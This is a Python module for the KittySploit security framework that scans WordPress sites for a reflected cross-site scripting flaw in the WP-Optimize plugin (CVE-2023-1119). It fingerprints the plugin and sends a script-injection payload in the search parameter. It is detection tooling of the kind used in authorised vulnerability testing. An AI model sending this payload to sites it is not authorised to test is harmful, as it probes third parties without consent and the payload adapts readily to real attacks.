#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The WP-Optimize WordPress plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP-Optimize WordPress plugin < 3.2.13 - Cross-Site Scripting Detection',
        'description': 'The WP-Optimize WordPress plugin before 3.2.13 and SrbTransLatin WordPress plugin before 2.4.1 are vulnerable to cross-site scripting due to a third-party library that improperly handles HTML character escaping.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wp', 'wp-plugin', 'wordpress', 'wp-optimize', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://wpscan.com/vulnerability/1119', 'https://nvd.nist.gov/vuln/detail/CVE-2023-1119'],
        'cve': 'CVE-2023-1119',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/wp-optimize',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/?s=<%2Fscript><script>alert%28document.domain%29<%2Fscript>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('</script><script>alert(document.domain)</script>', 'Search',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(severity='medium', reason='WP-Optimize WordPress plugin < 3.2.13 - Cross-Site Scripting detected', path=path)
            return True
        return False

